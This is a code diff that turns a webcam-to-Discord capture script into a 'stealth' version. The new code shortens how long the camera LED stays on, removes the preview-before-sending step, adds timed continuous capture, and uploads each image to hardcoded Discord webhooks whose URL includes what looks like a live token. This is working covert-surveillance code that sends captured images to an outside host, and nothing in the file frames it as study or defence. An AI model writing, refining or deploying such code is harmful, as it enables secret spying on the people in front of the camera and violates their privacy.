@@ -3,6 +3,7 @@ import requests
 from io import BytesIO
 import time
 from datetime import datetime
+import threading
 
 # Discord webhooks
 DISCORD_WEBHOOKS = [
@@ -10,32 +11,97 @@ DISCORD_WEBHOOKS = [
     "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
 ]
 
-def capture_image():
-    """Capture a single image from the default camera."""
-    # Open the default camera (usually 0)
-    cap = cv2.VideoCapture(0)
+class StealthCamera:
+    def __init__(self):
+        self.camera = None
+        self.last_capture = None
+        
+    def quick_capture(self):
+        """Ultra-fast capture to minimize camera LED time."""
+        try:
+            # Open camera with minimal settings
+            self.camera = cv2.VideoCapture(0)
+            
+            if not self.camera.isOpened():
+                print("Error: Could not open camera.")
+                return None
+            
+            # Set to lowest resolution for speed
+            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
+            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
+            
+            # Disable autofocus for speed (if available)
+            self.camera.set(cv2.CAP_PROP_AUTOFOCUS, 0)
+            
+            # Grab a few frames to let camera adjust quickly
+            for _ in range(3):
+                self.camera.grab()
+            
+            # Capture frame - LED will activate here
+            ret, frame = self.camera.read()
+            
+            # Release camera IMMEDIATELY - LED should turn off
+            self.camera.release()
+            self.camera = None
+            
+            if not ret:
+                print("Error: Could not capture image.")
+                return None
+            
+            return frame
+            
+        except Exception as e:
+            print(f"Capture error: {e}")
+            if self.camera:
+                self.camera.release()
+                self.camera = None
+            return None
     
-    if not cap.isOpened():
-        print("Error: Could not open camera.")
-        return None
+    def capture_with_prewarm(self, warm_frames=10):
+        """
+        Alternative: Pre-warm camera in background thread,
+        then capture quickly.
+        """
+        def prewarm_camera():
+            """Open and close camera quickly to pre-warm."""
+            try:
+                cam = cv2.VideoCapture(0)
+                if cam.isOpened():
+                    # Set low resolution
+                    cam.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
+                    cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
+                    
+                    # Grab frames without reading
+                    for _ in range(warm_frames):
+                        cam.grab()
+                    
+                    cam.release()
+            except:
+                pass
+        
+        # Start pre-warming in background
+        prewarm_thread = threading.Thread(target=prewarm_camera)
+        prewarm_thread.daemon = True
+        prewarm_thread.start()
+        
+        # Wait a moment
+        time.sleep(0.1)
+        
+        # Now do the actual capture
+        return self.quick_capture()
     
-    # Give camera time to adjust to light
-    time.sleep(0.5)
-    
-    # Capture a frame
-    ret, frame = cap.read()
-    
-    # Release the camera
-    cap.release()
-    
-    if not ret:
-        print("Error: Could not capture image.")
-        return None
-    
-    return frame
+    def capture_no_preview(self):
+        """
+        Capture without any preview or display windows
+        that might trigger longer camera activation.
+        """
+        return self.quick_capture()
 
 def send_to_discord(image, webhook_url, message=None):
     """Send image to a Discord webhook."""
+    if image is None:
+        return False
+        
     # Encode image to JPEG format in memory
     ret, buffer = cv2.imencode('.jpg', image, [cv2.IMWRITE_JPEG_QUALITY, 85])
     
@@ -60,117 +126,150 @@ def send_to_discord(image, webhook_url, message=None):
         response = requests.post(webhook_url, files=files, data=data)
         
         if response.status_code == 204:
-            print(f"Image sent successfully to Discord!")
+            print(f"✓ Image sent successfully!")
             return True
         else:
-            print(f"Error sending to Discord: Status {response.status_code}")
+            print(f"✗ Error: Status {response.status_code}")
             print(f"Response: {response.text}")
             return False
             
     except requests.exceptions.RequestException as e:
-        print(f"Request error: {e}")
+        print(f"✗ Request error: {e}")
         return False
 
-def capture_and_send():
-    """Capture image and send to all webhooks."""
-    print("Capturing image...")
-    image = capture_image()
+def stealth_capture_and_send():
+    """Capture and send with minimal camera activation."""
+    print("🕵️ Stealth capture in progress...")
+    
+    camera = StealthCamera()
+    
+    # Method 1: Quickest capture (LED on for shortest time)
+    print("⚡ Quick capture...")
+    image = camera.quick_capture()
+    
+    # Alternative: Uncomment for pre-warming
+    # print("⚡ Pre-warming and capturing...")
+    # image = camera.capture_with_prewarm()
     
     if image is None:
-        print("Failed to capture image.")
+        print("✗ Failed to capture image.")
         return
     
-    # Create timestamp for optional message
+    # Create timestamp message
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    message = f"Camera capture at {timestamp}"
+    message = f"Stealth capture at {timestamp}"
     
     # Send to all webhooks
     success_count = 0
     for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
-        print(f"Sending to webhook {i}...")
+        print(f"📤 Sending to webhook {i}...")
         if send_to_discord(image, webhook_url, message):
             success_count += 1
     
-    print(f"Successfully sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks.")
+    print(f"✅ Successfully sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks.")
 
-def continuous_capture(interval_seconds=10):
-    """Continuously capture and send images at specified intervals."""
-    print("Starting continuous capture...")
-    print(f"Press Ctrl+C to stop.")
-    print(f"Interval: {interval_seconds} seconds")
+def continuous_stealth_capture(interval_seconds=30):
+    """Continuous stealth captures."""
+    print("🔁 Starting continuous stealth mode...")
+    print("⚠️ Note: Camera LED will flash briefly for each capture")
+    print(f"⏱️ Interval: {interval_seconds} seconds")
+    print("🛑 Press Ctrl+C to stop\n")
+    
+    camera = StealthCamera()
     
     try:
         while True:
-            capture_and_send()
-            print(f"Waiting {interval_seconds} seconds...")
-            time.sleep(interval_seconds)
+            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Capturing...")
+            image = camera.quick_capture()
+            
+            if image is not None:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                message = f"Auto capture at {timestamp}"
+                
+                for webhook_url in DISCORD_WEBHOOKS:
+                    send_to_discord(image, webhook_url, message)
+            
+            # Wait for next capture
+            if interval_seconds > 5:
+                print(f"⏳ Waiting {interval_seconds} seconds...")
+                for remaining in range(interval_seconds, 0, -1):
+                    print(f"   {remaining} seconds remaining", end='\r')
+                    time.sleep(1)
+            else:
+                time.sleep(interval_seconds)
+                
     except KeyboardInterrupt:
-        print("\nStopped by user.")
+        print("\n\n🛑 Stopped by user.")
     except Exception as e:
-        print(f"Unexpected error: {e}")
+        print(f"\n⚠️ Unexpected error: {e}")
 
 if __name__ == "__main__":
-    # Install required packages if needed
-    # pip install opencv-python requests
+    # Required packages: pip install opencv-python requests
     
-    print("Discord Camera Capture Script")
-    print("=" * 30)
+    print("🕵️  Stealth Camera for Discord")
+    print("=" * 40)
+    print("⚠️ Important: Camera LED cannot be disabled via software")
+    print("   This script minimizes LED activation time\n")
     
-    # Test camera
-    print("Testing camera...")
-    test_capture = cv2.VideoCapture(0)
-    if not test_capture.isOpened():
-        print("Error: No camera found or camera is in use.")
+    # Test if camera exists
+    test_cap = cv2.VideoCapture(0)
+    if not test_cap.isOpened():
+        print("✗ Error: No camera found or camera is in use.")
         exit(1)
-    test_capture.release()
-    print("Camera test passed!")
+    test_cap.release()
+    print("✓ Camera detected")
     
     # Choose mode
     print("\nSelect mode:")
-    print("1. Capture and send once")
-    print("2. Continuous capture")
-    print("3. Single capture and view before sending")
+    print("1. Single stealth capture (LED flashes briefly)")
+    print("2. Continuous stealth mode")
+    print("3. Test capture speed")
     
-    choice = input("Enter choice (1-3): ").strip()
-    
-    if choice == '1':
-        # Single capture and send
-        capture_and_send()
+    try:
+        choice = input("Enter choice (1-3): ").strip()
         
-    elif choice == '2':
-        # Continuous capture
-        try:
-            interval = int(input("Enter interval in seconds (default: 10): ") or "10")
-        except ValueError:
-            interval = 10
-        continuous_capture(interval)
-        
-    elif choice == '3':
-        # Preview and send
-        print("Capturing image...")
-        image = capture_image()
-        
-        if image is not None:
-            # Show preview
-            cv2.imshow('Preview (Press any key to send, ESC to cancel)', image)
-            key = cv2.waitKey(0)
-            cv2.destroyAllWindows()
+        if choice == '1':
+            stealth_capture_and_send()
             
-            if key != 27:  # Not ESC
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                message = f"Camera capture at {timestamp}"
+        elif choice == '2':
+            try:
+                interval = int(input("Enter interval in seconds (default: 30): ") or "30")
+                if interval < 5:
+                    print("⚠️ Warning: Very short intervals may cause issues")
+                    confirm = input("Continue? (y/n): ").lower()
+                    if confirm != 'y':
+                        exit()
+            except ValueError:
+                interval = 30
+            continuous_stealth_capture(interval)
+            
+        elif choice == '3':
+            print("\n⏱️ Testing capture speed...")
+            camera = StealthCamera()
+            times = []
+            
+            for i in range(3):
+                print(f"Test {i+1}/3...")
+                start = time.time()
+                image = camera.quick_capture()
+                end = time.time()
                 
-                success_count = 0
-                for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
-                    print(f"Sending to webhook {i}...")
-                    if send_to_discord(image, webhook_url, message):
-                        success_count += 1
-                
-                print(f"Successfully sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks.")
+                if image is not None:
+                    capture_time = (end - start) * 1000
+                    times.append(capture_time)
+                    print(f"  Capture took: {capture_time:.0f}ms")
+                else:
+                    print("  Failed")
+            
+            if times:
+                avg = sum(times) / len(times)
+                print(f"\n📊 Average capture time: {avg:.0f}ms")
+                print(f"📷 Camera LED active for ~{avg:.0f}ms per capture")
             else:
-                print("Cancelled.")
+                print("✗ All tests failed")
+                
         else:
-            print("Failed to capture image.")
+            print("Invalid choice.")
             
-    else:
-        print("Invalid choice. Exiting.")
+    except KeyboardInterrupt:
+        print("\n\n🛑 Cancelled.")
